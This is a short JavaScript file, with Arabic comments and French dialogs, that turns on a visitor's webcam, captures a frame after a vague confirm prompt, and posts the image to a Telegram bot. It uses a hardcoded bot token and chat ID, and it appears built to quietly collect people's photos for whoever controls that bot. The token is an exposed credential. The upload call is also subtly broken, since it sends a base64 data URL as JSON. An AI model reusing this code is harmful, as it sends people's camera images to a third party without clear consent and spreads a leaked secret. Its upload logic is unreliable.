// script.js
const startCaptureButton = document.getElementById('startCapture');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');

startCaptureButton.addEventListener('click', () => {
 // طلب السماح بتفعيل الكاميرا
 navigator.mediaDevices.getUserMedia({ video: true })
 .then(stream => {
 video.srcObject = stream;
 video.play();

 // زر السماح بالتقاط الصورة
 const allowCapture = confirm('Permettez la capture de l\'image ?');
 if (allowCapture) {
 // التقاط الصورة تلقائيًا
 context.drawImage(video, 0, 0, canvas.width, canvas.height);

 // إرسال الصورة إلى تيليجرام تلقائيًا
 const imageData = canvas.toDataURL('image/png');
 const botToken = '7323434162:AAHNE_LwznKc2CCOehy7bwWMliqccgIguU4';
 const chatId = '6414801160';

 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json'
 },
 body: JSON.stringify({
 chat_id: chatId,
 photo: imageData
 })
 })
 .then(response => response.json())
 .then(data => {
 console.log('Success:', data);
 alert('L\'image a été envoyée avec succès à Telegram.');
 })
 .catch(error => {
 console.error('Error:', error);
 alert('Une erreur s\'est produite lors de l\'envoi de l\'image.');
 });
 }
 })
 .catch(err => {
 console.error('Error accessing camera:', err);
 alert('Erreur d\'accès à la caméra.');
 });
});